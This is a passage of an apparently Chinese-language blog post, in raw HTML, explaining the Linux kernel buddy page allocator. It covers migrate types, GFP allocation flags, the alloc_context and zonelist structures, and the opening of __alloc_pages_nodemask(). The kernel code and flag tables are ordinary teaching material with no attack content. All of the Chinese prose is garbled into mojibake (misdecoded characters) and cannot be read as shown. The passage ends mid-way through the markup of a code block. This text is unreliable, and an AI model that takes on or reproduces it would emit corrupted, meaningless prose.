CONFIG_MEMORY_ISOLATION</span><br>MIGRATE_ISOLATE,<span class="hljs-comment">/* can&#x27;t allocate from here */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>MIGRATE_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>MIGRATE_UNMOVABLE</strong>ï¼šè¿™ç±»å‹é¡µé¢åœ¨å†…å­˜å½“ä¸­æœ‰ç€å›ºå®šçš„ä½ç½®ï¼Œ<strong>ä¸èƒ½ç§»åŠ¨</strong></li><li><strong>MIGRATE_MOVABLE</strong>ï¼šè¿™ç±»é¡µé¢<strong>å¯ä»¥éšæ„ç§»åŠ¨</strong>ï¼Œä¾‹å¦‚ç”¨æˆ·ç©ºé—´çš„é¡µé¢ï¼Œæˆ‘ä»¬åªéœ€è¦å¤åˆ¶æ•°æ®åæ”¹å˜é¡µè¡¨æ˜ å°„å³å¯</li><li><strong>MIGRATE_RECLAIMABLE</strong>ï¼šè¿™ç±»é¡µé¢<strong>ä¸èƒ½ç›´æ¥ç§»åŠ¨ï¼Œä½†æ˜¯å¯ä»¥åˆ é™¤</strong>ï¼Œä¾‹å¦‚æ˜ å°„è‡ªæ–‡ä»¶çš„é¡µ</li><li><strong>MIGRATE_PCPTYPES</strong>ï¼š<code>per_cpu_pageset</code>ï¼Œå³æ¯ CPU é¡µå¸§ç¼“å­˜ï¼Œå…¶è¿ç§»<strong>ä»…é™äºåŒä¸€èŠ‚ç‚¹å†…</strong></li><li><strong>MIGRATE_CMA</strong>ï¼š<code>Contiguous Memory Allocator</code>ï¼Œå³<strong>è¿ç»­çš„ç‰©ç†å†…å­˜</strong></li><li><strong>MIGRATE_ISOLATE</strong>ï¼š<strong>ä¸èƒ½ä»è¯¥é“¾è¡¨åˆ†é…é¡µé¢</strong>ï¼Œè¯¥é“¾è¡¨ç”¨äºè·¨ NUMA èŠ‚ç‚¹è¿›è¡Œé¡µé¢ç§»åŠ¨ï¼Œå°†é¡µé¢ç§»åŠ¨åˆ°ä½¿ç”¨è¯¥é¡µé¢æœ€ä¸ºé¢‘ç¹çš„ CPU æ‰€å¤„èŠ‚ç‚¹</li><li><em>MIGRATE_TYPES</em>ï¼šè¡¨ç¤ºè¿ç§»ç±»å‹çš„æ•°ç›®ï¼Œ<em>å¹¶ä¸å­˜åœ¨è¿™ä¸€é“¾è¡¨</em></li></ul><p>ä»¥ <em>free_list[0]</em> ä½œä¸ºä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹ overviewï¼š</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="è‡ªå·±ç”»çš„å›¾.png"></p><h3 id="nr-freeï¼šç©ºé—²é¡µé¢ï¼ˆå—ï¼‰è®¡æ•°">nr_freeï¼šç©ºé—²é¡µé¢ï¼ˆå—ï¼‰è®¡æ•°</h3><p>è¯¥å­—æ®µè®°å½•äº†åœ¨å½“å‰ free_area ä¸­çš„ç©ºé—²é¡µé¢å—çš„æ•°é‡ï¼Œå¯¹äº free_area[0] ä»¥å¤–çš„ free_area è€Œè¨€å…¶å•ä½å¹¶éæ˜¯å•ä¸ªé¡µæ¡†ï¼Œè€Œæ˜¯ä»¥_å†…å­˜å—_ä¸ºå•ä½</p><h1>0x02.é¡µçš„åˆ†é…</h1><p>buddy system æä¾›äº†ä¸€ç»„ç”¨ä»¥è¿›è¡Œé¡µé¢åˆ†é…çš„æ¥å£ï¼Œæ¥ä¸‹æ¥ç¬”è€…å°†ä»¥è‡ªåº•å‘ä¸Šçš„æ–¹å¼è¿›è¡Œæºç åˆ†æ</p><h2 id="ä¸€ã€GFPï¼ˆget-free-pageï¼‰æ ‡å¿—ä½">ä¸€ã€GFPï¼ˆget free pageï¼‰æ ‡å¿—ä½</h2><blockquote><p>GFPæ ‡å¿—ä½è¿™ä¸€èŠ‚åŸºæœ¬ä¸Šæ¬è¿è‡ª<a href="https://blog.csdn.net/yhb1047818384/article/details/112298996">è¿™ç¯‡æ–‡ç« </a></p></blockquote><p>åœ¨ kernel memory allocation ä¸­æˆ‘ä»¬ç»å¸¸èƒ½è§åˆ° <code>gfp_t</code> ç±»å‹ï¼Œå…¶è¡¨ç¤ºåˆ†é…æ—¶çš„æ ‡å¿—ä½ï¼Œå®šä¹‰åœ¨ <code>include/linux/gfp.h</code> ä¸­ï¼Œå¤§æ¦‚æœ‰å¦‚ä¸‹è¿™äº›å¯ç”¨æ ‡å¿—ä½ï¼š</p><ul><li><strong>å†…å­˜ç®¡ç†åŒºä¿®é¥°ç¬¦ (zone modifiers)</strong></li></ul><p>å†…å­˜ç®¡ç†åŒºä¿®é¥°ç¬¦ä¸»è¦æè¿°ä»å“ªäº›å†…å­˜ç®¡ç†åŒºæ¥åˆ†é…å†…å­˜</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">__GFP_DMA</td><td style="text-align:left">ä»ZONE_DMAåŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td style="text-align:left">__GFP_HIGNMEM</td><td style="text-align:left">ä»ZONE_HIGHMEMåŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td style="text-align:left">__GFP_DMA32</td><td style="text-align:left">ä»ZONE_DMA32åŒºä¸­åˆ†é…å†…å­˜</td></tr><tr><td style="text-align:left">__GFP_MOVABLE</td><td style="text-align:left">å†…å­˜è§„æ•´æ—¶å¯ä»¥è¿ç§»æˆ–å›æ”¶é¡µé¢</td></tr></tbody></table><ul><li><strong>ç§»åŠ¨å’Œæ›¿æ¢ä¿®é¥°ç¬¦(mobility and placement modifiers)</strong></li></ul><p>ç§»åŠ¨å’Œæ›¿æ¢ä¿®é¥°ç¬¦ä¸»è¦è¡¨ç¤ºåˆ†é…å‡ºæ¥çš„é¡µé¢å…·æœ‰çš„è¿ç§»å±æ€§</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">__GFP_RECLAIMABLE</td><td style="text-align:left">åˆ†é…çš„å†…å­˜é¡µé¢å¯ä»¥å›æ”¶</td></tr><tr><td style="text-align:left">__GFP_WRITE</td><td style="text-align:left">ç”³è¯·çš„é¡µé¢ä¼šè¢«å¼„æˆè„é¡µ</td></tr><tr><td style="text-align:left">__GFP_HARDWALL</td><td style="text-align:left">å¼ºåˆ¶ä½¿ç”¨cpusetå†…å­˜åˆ†é…ç­–ç•¥</td></tr><tr><td style="text-align:left">__GFP_THISNODE</td><td style="text-align:left">åœ¨æŒ‡å®šçš„èŠ‚ç‚¹ä¸Šåˆ†é…å†…å­˜</td></tr><tr><td style="text-align:left">__GFP_ACCOUNT</td><td style="text-align:left">kmemcgä¼šè®°å½•åˆ†é…è¿‡ç¨‹</td></tr></tbody></table><ul><li><strong>æ°´ä½ä¿®é¥°ç¬¦ ï¼ˆwatermark modifiersï¼‰</strong></li></ul><p>ä¸æ°´ä½çº¿ç›¸å…³çš„æ ‡å¿—ä½</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">__GFP_ATOMIC</td><td style="text-align:left">é«˜ä¼˜å…ˆçº§åˆ†é…å†…å­˜ï¼Œåˆ†é…å™¨å¯ä»¥åˆ†é…æœ€ä½è­¦æˆ’æ°´ä½çº¿ä¸‹çš„é¢„ç•™å†…å­˜</td></tr><tr><td style="text-align:left">__GFP_HIGH</td><td style="text-align:left">åˆ†é…å†…å­˜çš„è¿‡ç¨‹ä¸­ä¸å¯ä»¥ç¡çœ æˆ–æ‰§è¡Œé¡µé¢å›æ”¶åŠ¨ä½œ</td></tr><tr><td style="text-align:left">__GFP_MEMALLOC</td><td style="text-align:left">å…è®¸è®¿é—®æ‰€æœ‰çš„å†…å­˜</td></tr><tr><td style="text-align:left">__GFP_NOMEMALLOC</td><td style="text-align:left">ä¸å…è®¸è®¿é—®æœ€ä½è­¦æˆ’æ°´ä½çº¿ä¸‹çš„ç³»ç»Ÿé¢„ç•™å†…å­˜</td></tr></tbody></table><ul><li><strong>é¡µé¢å›æ”¶ä¿®é¥°ç¬¦ï¼ˆreclaim modifiers)</strong></li></ul><p>ä¸é¡µé¢å›æ”¶ç›¸å…³çš„æ ‡å¿—ä½</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">__GFP_IO</td><td style="text-align:left">å¯åŠ¨ç‰©ç†I/Oä¼ è¾“</td></tr><tr><td style="text-align:left">__GFP_FS</td><td style="text-align:left">å…è®¸è°ƒç”¨åº•å±‚FSæ–‡ä»¶ç³»ç»Ÿã€‚å¯é¿å…åˆ†é…å™¨é€’å½’åˆ°å¯èƒ½å·²ç»æŒæœ‰é”çš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œ é¿å…æ­»é”</td></tr><tr><td style="text-align:left">__GFP_DIRECT_RECLAIM</td><td style="text-align:left">åˆ†é…å†…å­˜è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨ç›´æ¥å†…å­˜å›æ”¶</td></tr><tr><td style="text-align:left">__GFP_KSWAPD_RECLAIM</td><td style="text-align:left">å†…å­˜åˆ°è¾¾ä½æ°´ä½æ—¶å”¤é†’kswapdçº¿ç¨‹å¼‚æ­¥å›æ”¶å†…å­˜</td></tr><tr><td style="text-align:left">__GFP_RECLAIM</td><td style="text-align:left">è¡¨ç¤ºæ˜¯å¦å¯ä»¥ç›´æ¥å†…å­˜å›æ”¶æˆ–è€…ä½¿ç”¨kswapdçº¿ç¨‹è¿›è¡Œå›æ”¶</td></tr><tr><td style="text-align:left">__GFP_RETRY_MAYFAIL</td><td style="text-align:left">åˆ†é…å†…å­˜å¯ä»¥å¯èƒ½ä¼šå¤±è´¥ï¼Œä½†æ˜¯åœ¨ç”³è¯·è¿‡ç¨‹ä¸­ä¼šå›æ”¶ä¸€äº›ä¸å¿…è¦çš„å†…å­˜ï¼Œæ˜¯æ•´ä¸ªç³»ç»Ÿå—ç›Š</td></tr><tr><td style="text-align:left">__GFP_NOFAIL</td><td style="text-align:left">å†…å­˜åˆ†é…å¤±è´¥åæ— é™åˆ¶çš„é‡å¤å°è¯•ï¼ŒçŸ¥é“åˆ†é…æˆåŠŸ</td></tr><tr><td style="text-align:left">__GFP_NORETRY</td><td style="text-align:left">ç›´æ¥é¡µé¢å›æ”¶æˆ–è€…å†…å­˜è§„æ•´åè¿˜æ˜¯æ— æ³•åˆ†é…å†…å­˜æ—¶ï¼Œä¸å¯ç”¨retryåå¤å°è¯•åˆ†é…å†…å­˜ï¼Œç›´æ¥è¿”å›NULL</td></tr></tbody></table><ul><li><strong>è¡Œä¸ºä¿®é¥°ç¬¦ (action modifiers)</strong></li></ul><p>ä¸åˆ†é…æ—¶çš„è¡Œä¸ºç›¸å…³çš„æ ‡å¿—ä½</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">__GFP_NOWARN</td><td style="text-align:left">å…³é—­å†…å­˜åˆ†é…è¿‡ç¨‹ä¸­çš„WARNING</td></tr><tr><td style="text-align:left">__GFP_COMP</td><td style="text-align:left">åˆ†é…çš„å†…å­˜é¡µé¢å°†è¢«ç»„åˆæˆå¤åˆé¡µcompound page</td></tr><tr><td style="text-align:left">__GFP_ZERO</td><td style="text-align:left">è¿”å›ä¸€ä¸ªå…¨éƒ¨å¡«å……ä¸º0çš„é¡µé¢</td></tr></tbody></table><ul><li><strong>ç»„åˆç±»å‹æ ‡å¿—(Useful GFP flag combinations)</strong></li></ul><p>å‰é¢æè¿°çš„ä¿®é¥°ç¬¦ç§è¿‡äºç¹å¤šï¼Œå› æ­¤linuxå®šä¹‰äº†ä¸€äº›ç»„åˆçš„ç±»å‹æ ‡å¿—ï¼Œä¾›å¼€å‘è€…ä½¿ç”¨ã€‚</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">element</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">GFP_ATOMIC</td><td style="text-align:left">__GFP_HIGH |__GFP_ATOMIC |__GFP_KSWAPD_RECLAIM</td><td style="text-align:left">åˆ†é…è¿‡ç¨‹ä¸èƒ½ä¼‘çœ ï¼Œåˆ†é…å…·æœ‰é«˜ä¼˜å…ˆçº§ï¼Œå¯ä»¥è®¿é—®ç³»ç»Ÿé¢„ç•™å†…å­˜</td></tr><tr><td style="text-align:left">GFP_KERNEL</td><td style="text-align:left">__GFP_RECLAIM |__GFP_IO |__GFP_FS</td><td style="text-align:left">åˆ†é…å†…å­˜æ—¶å¯ä»¥è¢«é˜»å¡(å³ä¼‘çœ )</td></tr><tr><td style="text-align:left">GFP_KERNEL_ACCOUNT</td><td style="text-align:left">GFP_KERNEL |__GFP_ACCOUNT</td><td style="text-align:left">å’ŒGFP_KERNELä½œç”¨ä¸€æ ·ï¼Œä½†æ˜¯åˆ†é…çš„è¿‡ç¨‹ä¼šè¢«kmemcgè®°å½•</td></tr><tr><td style="text-align:left">GFP_NOWAIT</td><td style="text-align:left">__GFP_KSWAPD_RECLAIM</td><td style="text-align:left">åˆ†é…è¿‡ç¨‹ä¸­ä¸å…è®¸å› ç›´æ¥å†…å­˜å›æ”¶è€Œå¯¼è‡´åœé¡¿</td></tr><tr><td style="text-align:left">GFP_NOIO</td><td style="text-align:left">__GFP_RECLAIM</td><td style="text-align:left">ä¸éœ€è¦å¯åŠ¨ä»»ä½•çš„I/Oæ“ä½œ</td></tr><tr><td style="text-align:left">GFP_NOFS</td><td style="text-align:left">__GFP_RECLAIM |__GFP_IO</td><td style="text-align:left">ä¸ä¼šæœ‰è®¿é—®ä»»ä½•æ–‡ä»¶ç³»ç»Ÿçš„æ“ä½œ</td></tr><tr><td style="text-align:left">GFP_USER</td><td style="text-align:left">__GFP_RECLAIM |__GFP_IO |__GFP_FS |__GFP_HARDWALL</td><td style="text-align:left">ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹åˆ†é…å†…å­˜</td></tr><tr><td style="text-align:left">GFP_DMA</td><td style="text-align:left">__GFP_DMA</td><td style="text-align:left">ä»ZONE_DMAåŒºåˆ†é…å†…å­˜</td></tr><tr><td style="text-align:left">GFP_DMA32</td><td style="text-align:left">__GFP_DMA32</td><td style="text-align:left">ä»ZONE_DMA32åŒºåˆ†é…å†…å­˜</td></tr><tr><td style="text-align:left">GFP_HIGHUSER</td><td style="text-align:left">GFP_USER | __GFP_HIGHMEM</td><td style="text-align:left">ç”¨æˆ·è¿›ç¨‹åˆ†é…å†…å­˜ï¼Œä¼˜å…ˆä½¿ç”¨ZONE_HIGHMEMï¼Œ ä¸”è¿™äº›é¡µé¢ä¸å…è®¸è¿ç§»</td></tr><tr><td style="text-align:left">GFP_HIGHUSER_MOVABLE</td><td style="text-align:left">GFP_HIGHUSER | __GFP_MOVABLE</td><td style="text-align:left">å’ŒGFP_HIGHUSERç±»ä¼¼ï¼Œä½†æ˜¯é¡µé¢å¯ä»¥è¿ç§»</td></tr><tr><td style="text-align:left">GFP_TRANSHUGE_LIGHT</td><td style="text-align:left">GFP_HIGHUSER_MOVABLE | __GFP_COMP | __GFP_NOMEMALLOC | __GFP_NOWARN) &amp; ~__GFP_RECLAIM</td><td style="text-align:left">é€æ˜å¤§é¡µçš„å†…å­˜åˆ†é…ï¼Œ lightè¡¨ç¤ºä¸è¿›è¡Œå†…å­˜å‹ç¼©å’Œå›æ”¶</td></tr><tr><td style="text-align:left">GFP_TRANSHUGE</td><td style="text-align:left">GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM</td><td style="text-align:left">å’ŒGFP_TRANSHUGE_LIGHTç±»ä¼¼ï¼Œé€šå¸¸khugepagedä½¿ç”¨è¯¥æ ‡å¿—</td></tr></tbody></table><h2 id="äºŒã€alloc-context-ç»“æ„ä½“ï¼šåˆ†é…çš„ä¸Šä¸‹æ–‡">äºŒã€alloc_context ç»“æ„ä½“ï¼šåˆ†é…çš„ä¸Šä¸‹æ–‡</h2><p>è¿™æ˜¯ä¸€ä¸ªåˆ†é…è¿‡ç¨‹ä¸­éå¸¸é‡è¦çš„ç»“æ„ä½“ï¼Œç”¨æ¥è¡¨ç¤ºæˆ‘ä»¬å•æ¬¡å†…å­˜åˆ†é…çš„ä¸Šä¸‹æ–‡ä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç”¨ä»¥ä¿å­˜åœ¨åˆ†é…æ—¶æ¶‰åŠåˆ°çš„å‡½æ•°é—´ä¼ é€’çš„</span><br><span class="hljs-comment"> * ç»å¤§éƒ¨åˆ†çš„ä¸å¯å˜çš„åˆ†é…å‚æ•°çš„ç»“æ„ä½“ï¼Œ</span><br><span class="hljs-comment"> * åŒ…æ‹¬ alloc_pages å‡½æ•°æ—</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * nodemask, migratetype ä¸ highest_zoneidx ä»…åœ¨</span><br><span class="hljs-comment"> * __alloc_pages_nodemask() ä¸­è¢«åˆå§‹åŒ–ä¸€æ¬¡ï¼Œä¹‹åä¸å†æ”¹å˜.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * zonelist, preferred_zone ä¸ highest_zoneidx æœ€åˆåœ¨</span><br><span class="hljs-comment"> * __alloc_pages_nodemask() ä¸­ä¸ºå¿«é€Ÿè·¯å¾„è®¾ç½®, ä¹‹åå¯èƒ½ä¼šåœ¨</span><br><span class="hljs-comment"> * __alloc_pages_slowpath() ä¸­è¢«æ”¹å˜. å…¶ä»–æ‰€æœ‰çš„å‡½æ•°é€šè¿‡</span><br><span class="hljs-comment"> * å¸¸é‡æŒ‡é’ˆä¼ é€’è¯¥ç»“æ„ä½“ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> *<span class="hljs-title">zonelist</span>;</span><br><span class="hljs-type">nodemask_t</span> *nodemask;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> *<span class="hljs-title">preferred_zoneref</span>;</span><br><span class="hljs-type">int</span> migratetype;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * highest_zoneidx è¡¨ç¤ºåˆ†é…è¯·æ±‚ä¸­æœ€é«˜çš„å¯ç”¨ zone çš„ä¸‹æ ‡ã€‚</span><br><span class="hljs-comment"> * ç”±äº zone çš„æ€§è´¨, ç›¸è¾ƒäº highest_zoneidxï¼Œ</span><br><span class="hljs-comment"> * åœ¨æ›´ä½çš„ zone ä¸Šçš„å†…å­˜ä¼šç”± lowmem_reserve[highest_zoneidx] ä¿æŠ¤ã€‚</span><br><span class="hljs-comment"> * è¯‘æ³¨ï¼šå°±æ˜¯æ°´ä½çº¿æœºåˆ¶ï¼Œä¸è®°å¾—çš„å›å»çœ‹ä¸Šä¸€ç¯‡æ–‡ç« </span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * highest_zoneidx åŒæ ·è¢«å›æ”¶/å‹ç¼©ä½¿ç”¨ä»¥é™åˆ¶ç›®æ ‡ zoneï¼Œ</span><br><span class="hljs-comment"> * å› ä¸ºé«˜äºè¯¥ä¸‹æ ‡çš„ zone æ— æ³•ç”¨äºæ­¤åˆ†é…è¯·æ±‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> <span class="hljs-title">highest_zoneidx</span>;</span><br><span class="hljs-type">bool</span> spread_dirty_pages;<br>&#125;;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨å¦‚ä¸‹æˆå‘˜ï¼š</p><ul><li>zonelist</li></ul><p>è¯¥æˆå‘˜è¡¨ç¤ºåœ¨<strong>è¿™ä¸€æ¬¡çš„åˆ†é…ä¸Šä¸‹æ–‡</strong>ä¸­ï¼Œæˆ‘ä»¬å°†è¦æ“ä½œçš„ zone çš„<strong>åˆ—è¡¨</strong>ï¼Œå…¶ä¸ºä¸€ä¸ª <code>zonelist</code> ç±»å‹çš„<strong>ç»“æ„ä½“æ•°ç»„</strong>ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å•æ¬¡åˆ†é…è¯·æ±‚åœ¨ä¸€ä¸ª zonelist ä¸Šæ“ä½œ. ä¸€ä¸ª zonelist ä¾¿æ˜¯ä¸€ç»„ zone çš„åˆ—è¡¨ï¼Œ</span><br><span class="hljs-comment"> * å…¶ä¸­ç¬¬ä¸€ä¸ª zone ä¸ºåˆ†é…çš„â€œç›®æ ‡â€ï¼Œè€Œå…¶ä»–çš„ zone ä¸ºåå¤‡çš„zoneï¼Œä¼˜å…ˆçº§é™ä½ã€‚</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ä¸ºäº†æé«˜ zonelist çš„è¯»å–é€Ÿåº¦, åœ¨ zonerefs ä¸­åŒ…å«æ­£åœ¨è¢«è¯»å–çš„ entry çš„ zone indexã€‚</span><br><span class="hljs-comment"> * ç”¨æ¥è®¿é—®æ‰€ç»™çš„ zoneref ç»“æ„ä½“ä¿¡æ¯çš„å¸®åŠ©å‡½æ•°æœ‰ï¼š</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * zonelist_zone()- è¿”å›ä¸€ä¸ª struct zone çš„æŒ‡é’ˆä½œä¸º _zonerefs ä¸­çš„ä¸€ä¸ª entry</span><br><span class="hljs-comment"> * zonelist_zone_idx()- è¿”å›ä½œä¸º entry çš„ zone çš„ index</span><br><span class="hljs-comment"> * zonelist_node_idx()- è¿”å›ä½œä¸º entry çš„ node çš„ index</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> _<span class="hljs-title">zonerefs</span>[<span class="hljs-title">MAX_ZONES_PER_ZONELIST</span> + 1];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯å…¶ä¸ºä¸€ä¸ª  <code>zoneref</code> ç±»å‹çš„ç»“æ„ä½“æ•°ç»„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼ŒåŒ…å«äº†ä¸€ä¸ª zone çš„æŒ‡é’ˆä»¥åŠä¸€ä¸ª indexï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è¯¥ç»“æ„åŒ…å«äº† zonelist ä¸­ä¸€ä¸ª zone çš„ä¿¡æ¯ã€‚ </span><br><span class="hljs-comment"> * å…¶è¢«å‚¨å­˜åœ¨è¿™é‡Œä»¥é¢„é˜²å¯¹å¤§ç»“æ„ä½“çš„è§£å¼•ç”¨ä¸å¯¹è¡¨çš„æŸ¥è¯¢ã€‚</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>;</span><span class="hljs-comment">/* æŒ‡å‘å®é™…ä¸Šçš„ zone çš„æŒ‡é’ˆ */</span><br><span class="hljs-type">int</span> zone_idx;<span class="hljs-comment">/* zone_idx(zoneref-&gt;zone) */</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>preferred_zoneref</li></ul><p>è¯¥æˆå‘˜ä¸ºä¸€ä¸ª <code>zoneref</code> ç±»å‹çš„ç»“æ„ä½“ï¼Œè¡¨ç¤º<strong>ä¼˜å…ˆç”¨æ¥è¿›è¡Œåˆ†é…çš„ zone</strong></p><ul><li>spread_dirty_pages</li></ul><p>å¸ƒå°”å€¼ï¼Œè¡¨ç¤º<strong>æ­¤æ¬¡åˆ†é…æ˜¯å¦å¯èƒ½äº§ç”Ÿè„é¡µ</strong>ï¼ˆéœ€è¦è¿›è¡Œå†™å›ï¼‰ï¼Œé€šå¸¸åˆ†é…éœ€è¦å†™å…¥çš„é¡µä¼šå‡ºç°</p><h2 id="ä¸‰ã€-alloc-pages-nodemask-ï¼šåˆ†é…é¡µé¢çš„ã€Œæ ¸å¿ƒå‡½æ•°ã€ï¼Œè¿”å›-page-ç»“æ„ä½“">ä¸‰ã€__alloc_pages_nodemask()ï¼šåˆ†é…é¡µé¢çš„ã€Œæ ¸å¿ƒå‡½æ•°ã€ï¼Œè¿”å› page ç»“æ„ä½“</h2><p>è¯¥å‡½æ•°æ˜¯ buddy system ä¸­ç”¨ä»¥è¿›è¡Œé¡µé¢åˆ†é…çš„<strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼Œæ‰€æœ‰çš„é¡µé¢åˆ†é… API éƒ½æ˜¯åŸºäºè¯¥å‡½æ•°çš„å°è£…ï¼Œå…¶éœ€è¦ä¼ å…¥çš„å››ä¸ªå‚æ•°ä¸ºï¼š</p><ul><li><code>gfp_mask</code>ï¼šåˆ†é…è¡Œä¸ºå‚æ•°ï¼ˆå¯ä»¥å‚è§ <a href="https://blog.csdn.net/choumin/article/details/109603011">è¿™é‡Œ</a>ï¼‰</li><li><code>order</code>ï¼šåˆ†é…çš„è¿ç»­ç‰©ç†é¡µæ¡†çš„é˜¶</li><li><code>preferred_nid</code> é€‰å–çš„èŠ‚ç‚¹çš„ id</li><li><code>nodemask</code>ï¼š</li></ul><p>è¿”å›å€¼ä¸ºåˆ†é…çš„<strong>è¿ç»­ç‰©ç†é¡µ</strong>ä¸­çš„ç¬¬ä¸€å¼ ç‰©ç†é¡µçš„ <code>page</code> ç»“æ„ä½“</p><blockquote><p>å¦‚æœä½ å·²ç»ä¸è®°å¾— page ç»“æ„ä½“ä¸ç‰©ç†é¡µçš„é¡µæ¡†å·é—´çš„è½¬æ¢å…¬å¼äº†ï¼Œå¯ä»¥å›å»çœ‹<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#%EF%BC%881%EF%BC%89page-%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%B0-PFN%EF%BC%9Apage-%E7%BB%93%E6%9E%84%E4%BD%93%E5%9C%B0%E5%9D%80%E5%87%8F%E5%8E%BB%E5%AF%B9%E5%BA%94-mem-section-gt-section-mem-map">ä¸Šä¸€ç¯‡æ–‡ç« </a></p><p>å½“ç„¶ï¼Œç¬”è€…æ¯”è¾ƒå¥½å¿ƒï¼ˆç¬‘ï¼‰ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºè®¡ç®—å…¬å¼ï¼Œ<code>mem_section</code> ç»“æ„ä½“ä¸­çš„ <code>section_mem_map</code> æˆå‘˜å­˜å‚¨äº†å…¶èµ·å§‹åœ°å€å‡æ‰å…¶èµ·å§‹åœ°å€å¯¹åº”çš„ç‰©ç†é¡µæ¡†çš„é¡µæ¡†å·çš„å·®å€¼ï¼Œè¯¥æˆå‘˜ä¸ page ç»“æ„ä½“é—´åš<strong>æŒ‡é’ˆå·®å€¼è¿ç®—</strong>ä¾¿èƒ½è·å¾— page ç»“æ„ä½“å¯¹åº”çš„ç‰©ç†é¡µæ¡†å·ï¼š<br>$$<br>address_{struct\ page} - section_mem_map = address_{struct\ page} - (address_{mem_map} - start_PFN)\<br>=(address_{struct\ page} - address_{mem_map}) + start_PFN<br>\<br>=PFN<br>$$</p></blockquote><p>è¿™æ˜¯ä¸€å¼ _Overview_</p><p><img src="https://i.loli.net/2021/11/30/9srbaMvWeTSO1hc.png" alt="ä»çŸ¥ä¹å·çš„.png"></p><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 